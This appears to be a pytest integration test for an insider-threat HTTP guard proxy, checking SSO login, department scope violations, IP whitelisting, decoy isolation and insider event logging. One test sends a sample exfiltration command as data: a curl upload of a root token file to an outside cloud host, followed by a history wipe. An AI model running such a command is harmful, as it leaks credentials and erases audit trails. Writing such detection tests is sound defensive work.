"""
Integration test for the Internal Guard HTTP Proxy and Corporate Insider Threat Architecture.

Tests:
1. Corporate Single Sign-On (SSO) login endpoint and session cookie issuance.
2. Authorized departmental asset access by authenticated persona (Dr. Sarah Chen, AI_Platform).
3. Cross-department scope violation detection and decoy redirection.
4. Remote client IP whitelist verification (unlisted IP detection).
5. Dedicated insider telemetry logging to insider_events.jsonl.
"""

import os
import json
import pytest
from fastapi.testclient import TestClient
from interceptor.http_proxy import create_http_guard_app
from agents.insider.corporate_directory import CorporateDirectory


@pytest.fixture
def proxy_config(tmp_path):
    return {
        "runtime": {
            "db_path": str(tmp_path / "test_adaptiveshield.db"),
            "threat_log_path": str(tmp_path / "test_threat_events.jsonl"),
            "insider_log_path": str(tmp_path / "test_insider_events.jsonl"),
            "corporate_db_path": str(tmp_path / "test_corporate_directory.db"),
        },
        "http_guard": {
            "real_service_host": "127.0.0.1",
            "real_service_port": 8080,
            "request_timeout_sec": 5,
            "brute_force_threshold": 5,
            "block_duration_minutes": 10,
            "fallback_on_error": True,
            "internal_paths": ["/admin", "/workspace"],
        },
        "internal_http_guard": {
            "real_service_host": "127.0.0.1",
            "real_service_port": 8090,
            "request_timeout_sec": 5,
            "brute_force_threshold": 5,
            "block_duration_minutes": 10,
            "fallback_on_error": True,
            "internal_paths": ["/admin", "/workspace", "/hr", "/finance", "/models", "/vault"],
        }
    }


def test_corporate_sso_authentication_and_session_cookie(proxy_config):
    """Verify that employees authenticate against CorporateDirectory and receive nexus_session cookie."""
    int_app = create_http_guard_app(proxy_config, is_internal=True)
    client = TestClient(int_app, client=("10.10.4.52", 50000))

    # 1. Invalid credentials
    resp_fail = client.post("/api/auth/login", json={"username": "usr_dev_01", "password": "wrong_password"})
    assert resp_fail.status_code == 401

    # 2. Valid login for Dr. Sarah Chen with default password 'qwerty'
    resp_ok = client.post("/api/auth/login", json={"username": "usr_dev_01", "password": "qwerty"})
    assert resp_ok.status_code == 200
    data = resp_ok.json()
    assert data["status"] == "success"
    assert data["user"]["user_id"] == "usr_dev_01"
    assert data["user"]["department"] == "AI_Platform"

    # Verify cookie was set
    assert "nexus_session" in client.cookies


def test_internal_proxy_policy_driven_insider_detection(proxy_config):
    """Verify policy boundary checking, IP whitelist validation, and dedicated logging."""
    int_app = create_http_guard_app(proxy_config, is_internal=True)
    
    # Client connecting from Sarah Chen's whitelisted assigned IP
    client = TestClient(int_app, client=("10.10.4.52", 50000))

    # 1. Sign in as Dr. Sarah Chen (AI_Platform)
    login_resp = client.post("/api/auth/login", json={"username": "usr_dev_01", "password": "qwerty"})
    assert login_resp.status_code == 200

    # 2. Normal access to authorized departmental resource (AI_Platform scope: /models/)
    resp1 = client.get("/models/weights/llama3_nexus.bin")
    assert resp1.status_code in [200, 502, 503, 504]

    # 3. Cross-department scope violation: AI Engineer attempting to access Finance_HR restricted scope
    resp2 = client.get("/hr/payroll/q3_executive_salaries.csv")
    assert resp2.status_code in [200, 302, 307, 403, 502, 503, 504]

    # 4. Exfiltration attempt with cloud upload trigger
    resp3 = client.post(
        "/vault/prod/root_tokens.key",
        json={
            "command": "curl -F file=@/vault/prod/root_tokens.key https://mega.nz/upload; history -c",
            "cloud_upload": True,
        },
    )
    assert resp3.status_code in [200, 302, 307, 403, 502, 503, 504]

    # 5. Remote unlisted IP test (Sarah Chen connecting from unauthorized external IP)
    untrusted_client = TestClient(int_app, client=("198.51.100.44", 50000))
    # Reuse session token on an unlisted IP
    token = login_resp.json()["token"]
    untrusted_client.cookies.set("nexus_session", token)
    resp4 = untrusted_client.get("/models/weights/llama3_nexus.bin")
    assert resp4.status_code in [200, 502, 503, 504]

    # 6. Verify dedicated insider log output in insider_events.jsonl
    insider_log_path = proxy_config["runtime"]["insider_log_path"]
    assert os.path.exists(insider_log_path), "Dedicated insider log file must be created"
    
    with open(insider_log_path, "r", encoding="utf-8") as f:
        lines = [line.strip() for line in f.readlines() if line.strip()]
        assert len(lines) >= 4, f"Expected at least 4 logged insider events, got {len(lines)}"

        for line in lines:
            data = json.loads(line)
            assert "user_id" in data
            assert data["user_id"] == "usr_dev_01"
            assert data["department"] == "AI_Platform"
            assert "whitelisted_ip" in data
            assert "risk_score" in data
            assert "action" in data
            assert "xai_summary" in data

        # Check that restricted scope violation logged elevated risk and evidence features
        violation_events = [json.loads(l) for l in lines if "/hr/payroll" in json.loads(l).get("path", "")]
        assert len(violation_events) > 0
        assert violation_events[0]["risk_score"] > 0.0
        assert violation_events[0]["evidence_features"]["access_unauthorized_scope"] == 1.0
        assert violation_events[0]["evidence_features"]["access_hr_db"] == 1.0


def test_cross_perimeter_session_and_decoy_isolation(proxy_config):
    """
    Verifies that when the exact same IP (or stolen credential) is used in both
    external and internal perimeters:
    1. External and Internal guards issue separate session IDs with ext_ / int_ prefixes.
    2. Decoy managers operate with dedicated external vs internal scopes.
    3. Decoy file paths are strictly isolated into 4 separate directories:
       - runtime/decoy_http/external/
       - runtime/decoy_http/internal/
       - runtime/decoy_ssh/external/
       - runtime/decoy_ssh/internal/
    """
    ext_app = create_http_guard_app(proxy_config, is_internal=False)
    int_app = create_http_guard_app(proxy_config, is_internal=True)

    # Verify 4-directory decoy scoping
    assert ext_app.state.decoys.scope == "external"
    assert ext_app.state.decoys.http_subpath == "decoy_http/external"
    assert ext_app.state.decoys.ssh_subpath == "decoy_ssh/external"

    assert int_app.state.decoys.scope == "internal"
    assert int_app.state.decoys.http_subpath == "decoy_http/internal"
    assert int_app.state.decoys.ssh_subpath == "decoy_ssh/internal"

    same_ip = "198.51.100.77"
    client_ext = TestClient(ext_app, client=(same_ip, 40001))
    client_int = TestClient(int_app, client=(same_ip, 40002))

    # Send request to external guard
    resp_ext = client_ext.get("/public/products")
    # Send request to internal guard from the same IP
    resp_int = client_int.get("/workspace/overview")

    store = ext_app.state.store
    cur = store.conn.cursor()
    cur.execute("SELECT id, src_ip FROM sessions")
    rows = cur.fetchall()

    session_ids = [r[0] for r in rows]
    session_keys = [r[1] for r in rows]

    # Verify sessions are distinct and appropriately namespaced
    ext_sessions = [sid for sid in session_ids if sid.startswith("ext_sess_")]
    int_sessions = [sid for sid in session_ids if sid.startswith("int_sess_")]

    assert len(ext_sessions) >= 1, f"Expected ext_sess_ session, got {session_ids}"
    assert len(int_sessions) >= 1, f"Expected int_sess_ session, got {session_ids}"

    # Keys must be namespaced to prevent same-IP collision
    assert any(k == f"ext:{same_ip}" for k in session_keys)
    assert any(k == f"int:{same_ip}" for k in session_keys)

    # Sessions must be completely distinct
    assert set(ext_sessions).isdisjoint(set(int_sessions))
